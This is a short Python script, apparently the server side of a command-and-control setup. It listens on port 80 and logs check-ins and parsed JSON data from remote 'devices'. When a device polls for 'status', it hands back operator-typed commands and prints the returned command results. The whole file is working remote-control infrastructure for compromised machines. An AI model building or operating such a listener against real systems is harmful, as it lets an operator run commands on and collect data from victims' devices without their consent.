import socket
import json
import re

HOST = ''
PORT = 80

serverSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
serverSocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
serverSocket.bind((HOST, PORT))
serverSocket.listen(1)
    
print(f"Listening on http://{HOST}:{PORT} ...")

while True:
	clientconn, clientaddr = serverSocket.accept()
	
	res = ''
	
	request = clientconn.recv(1024).decode('utf-8')
	if 'microsoft' in request:
		continue
	
	if 'POST' in request:
		print('\nPOST request received...\n')
	else:
		print('\nGET request received....\n')
		
		
	print(f"Received request from {clientaddr}:\n{request}")
	
	jsonRes = re.findall('\{.+',request)
	
	if jsonRes:

		loadJson = json.loads(jsonRes[0])
		parseJson = json.dumps(loadJson, indent=4)
		
		print(f'\nParsed data:\n\n{parseJson}\n')
	
	else:
		print('\nNo POST data was received...\n')
		
	if 'os_info' in request:
		print('Device initial checkin-in, no response needed...')
	elif 'status' in request:
		print('Device checking for commands')
		res = input('Waiting for response...: ')
	else:
		print('Command results...')
	
	
	reslen = len(res)
	response = (
	"HTTP/1.1 200 OK\r\n"
	"Content-Type: text/plain\r\n"
	f"Content-Length: {reslen}\r\n"
	"\r\n"
	f"{res}"
	)
	
	try:
		clientconn.sendall(response.encode('utf-8'))
	except:
		print('exception recieved')
		continue

	clientconn.close()
